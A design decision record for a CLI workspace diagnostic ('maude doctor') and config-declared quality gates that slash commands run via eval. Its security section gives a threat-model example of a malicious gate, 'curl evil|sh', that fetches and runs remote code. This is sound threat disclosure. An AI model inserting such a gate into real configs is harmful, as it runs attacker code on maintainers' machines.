# DDR-057 — `maude doctor` as unified workspace diagnostic (deps + config + quality); slash commands call internal libs directly

**Status:** Accepted — 2026-05-28.
**Supersedes:** the never-shipped DDR number Phase A originally reserved (047, then 053 in the plan text — both taken by the time PR 3–5 landed; 053 = hub admin auth, 054–056 also taken). This DDR is the canonical record for Phase A (`.ai/plans/phase-a-deps-and-preflight.md`).
**Related:** the `biome-recurring-failures-review.md` system review (Layer 5 motivation), [DDR-043](DDR-043-bias-free-design-plugin-templates.md) (bias-free templates — same "no opinionated defaults" spirit applied to the design plugin), [DDR-026] (the accepted dev-server tsc baseline that shapes the `typecheck` decision below), and the `feedback-no-redundant-tooling-over-pnpm` + `flow-plugin-project-agnostic` memories.

## Context

Three problem classes shared one root cause — *expected state was never declared as data, so drift was invisible*:

1. **Dependency health** — `/design:screenshot`, `/flow:scenario` etc. hard-require `agent-browser` / `bun` / `agent-device`, but failed mid-flow with cryptic errors. No upfront check, no install hint, no diagnostic command.
2. **Config correctness** — this repo's own `.ai/workflows.config.json` declared `stack.language: javascript` (it's TS), `stack.framework: none` (next.js), `stack.tests: node-test` (not an enum value). Nothing caught it; skills silently degraded.
3. **Quality-gate declaration** — the schema declared only `stack.tests`. Lint/format/typecheck/tests/build existed only as **prose** in flow commands, so the agent inferred the command each time and sometimes skipped it → lint debt → CI catches it on `main` → emergency `chore(lint): biome …` commits (6/month baseline, per the review).

## Decision

**One user-facing diagnostic — `maude doctor` — reports deps + config schema + stack drift + quality-gate additions in a single sectioned report.** `--plugin` scopes the deps section, `--fix` applies safe auto-fixes, `--json` emits a structured envelope. Exit 1 on any hard-dep miss or schema error; drift + additions are warnings (exit 0).

Supporting decisions:

- **No wrapper over `pnpm`.** No `maude quality run`, `quality list/check`, `maude config validate`, or `maude config diff`. Quality gates live in `workflows.config.json` → top-level `quality` (a flat `gate → shell-command` map; `additionalProperties: { type: string }`, free-form names — no `GateSpec` object, no `order`/`scope`/`blocking` fields). Slash commands read it via `jq` + `eval`. Wrapping `pnpm` in a `maude` subcommand is a runner around a runner.
- **Slash commands call the libs directly** (`cli/lib/{preflight,config-lint,stack-detect}.mjs`) — no `maude doctor` CLI roundtrip from inside `/flow:validate` Step 0.5. The CLI is the user entry; the libs are shared infrastructure.
- **`--fix` is never silent.** Per-dep install prompt; config edits are additive (drift-resync only where the detector returned a concrete value; quality additions only set-if-absent). It NEVER overwrites a key the user wrote a real value into, and NEVER auto-migrates an invalid enum (user's decision).
- **Gates are per-project and user-owned.** The flow plugin and the `ai-skeleton` template carry **no** opinionated quality/stack defaults (skeleton has no `quality` block); `maude doctor --fix` populates from detection. This mirrors DDR-043's bias-free stance for the design plugin.
- **SessionStart hooks warn only for deps**, never config (config noise mid-feature is obnoxious; it surfaces in `/flow:validate` / `/flow:utils-verify` where it's actionable). Hooks live at the Claude-Code-canonical `plugins/<plugin>/hooks/hooks.json` (NOT the top-level `hooks.json` the plan first assumed) and ship via the marketplace clone, not npm.

## Decisions specific to THIS repo's dogfood config (not policy for Maude users)

- **`stack.tests: "unknown"`.** The real suites are `node --test` (cli) + `bun test` (dev-server), neither of which is a schema enum value. The detector reports `playwright` (false positive — `@playwright/test` is a video-smoke-only devDep), so `maude doctor` shows a permanent ~1-item `tests` drift. Accepted: `unknown` is the honest value (`flow:testing-rules` degrades gracefully); the drift is a known detector artifact, not real config rot.
- **`quality` block mirrors `quality.yml`** — `lint`, `tests` (`pnpm test && pnpm test:dev-server`), `build` (site), plus custom gates `parity` / `tarball` / `tokens` / `site-content` (the generated-reference + stats drift check). The goal the repo owner stated: local `/flow:validate` should catch what CI catches, before push.
- **`typecheck` is intentionally omitted.** `quality.yml` runs no `tsc` step — the dev-server has 3 accepted DDR-026 baseline errors, so a real typecheck gate would be permanently red and would block `/flow:validate`. Gates mirror CI; CI has no typecheck, so neither do we. (Revisit if/when DDR-026 is cleared.)

## Why this is DDR-worthy

A new top-level CLI subcommand, a new schema property, a new SessionStart hook surface, and a rewrite of how five flow commands declare their gates — all behavior downstream users feel. The "no wrapper over pnpm" and "gates are user-owned, never opinionated defaults" constraints are easy to violate in a later well-meaning PR; pinning them here makes a regression auditable.

## Trust boundary (security)

Flow commands run quality gates via `eval "$(jq -r '.quality.<gate>' …)"` — i.e. they **execute arbitrary shell strings read from `.ai/workflows.config.json`**. This is deliberate and is the same trust model as `package.json` scripts, a `Makefile`, or `.github/workflows`: the config is a repo-committed, user-owned file, and a gate command is exactly as trusted as the repo it lives in. The one new wrinkle to keep in mind: a **malicious PR** could add a gate like `"lint": "curl evil|sh"` that executes when a maintainer runs `/flow:validate` locally against that PR's branch — identical to the long-standing "never run an untrusted PR's `npm test` / build scripts on your machine" hazard, not a new vulnerability class introduced by this work. No mitigation is added in v1 (it would have to apply equally to every script-runner in the repo); reviewers diffing a PR's `quality` block is the control. Recorded here so the `eval`-of-config decision is explicit rather than accidental.

## Consequences

- Adding a dep = edit `plugins/<plugin>/dependencies.json`; it surfaces in the next `maude doctor` / `/design:init` / `/flow:init` with no command-markdown change.
- New quality concerns = add a `quality.<name>` entry; `/flow:validate` Step 3.5 + release pre-flight pick up custom gates automatically.
- **Outcome metric:** the rate of `chore(lint): biome …` emergency cleanup commits should drop to <1/quarter (baseline 6/month). Re-measure one quarter after Phase A is in active use.
- Open follow-up (maybe DDR-058): SessionStart hook policy (warn-only vs blocking) once we observe whether users act on the warning; and whether the `stack-detect` `tests` heuristic should de-prioritize a runner that only appears in a `*:smoke` script.
